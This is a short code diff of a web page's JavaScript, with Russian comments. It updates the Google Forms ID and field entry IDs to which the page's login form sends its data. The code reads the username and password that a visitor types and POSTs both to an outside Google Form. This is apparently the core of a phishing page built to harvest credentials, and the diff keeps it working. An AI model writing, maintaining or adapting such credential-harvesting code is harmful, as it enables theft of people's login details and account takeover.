@@ -42,13 +42,13 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // === ВАШИ ДАННЫЕ ===
-      const FORM_ID = '1FAIpQLSei9n5rFr2QO2HNBihpcsKA_k59TESP0ux6Jk2EcDc75EJzFw';
+      // === НОВЫЙ FORM_ID И ВАШИ ID ПОЛЕЙ ===
+      const FORM_ID = '1FAIpQLScu5xOIp9J2D_5yOH5nZCYdHisE-kgxL1TCuU-TTr5LDFF2mg';
       const formUrl = https://docs.google.com/forms/d/e/${FORM_ID}/formResponse;
       
       const formData = new FormData();
-      formData.append('entry.1955812404', username);
-      formData.append('entry.1686705368', password);
+      formData.append('entry.1789042509', username);
+      formData.append('entry.416258701', password);
 
       fetch(formUrl, {
         method: 'POST',
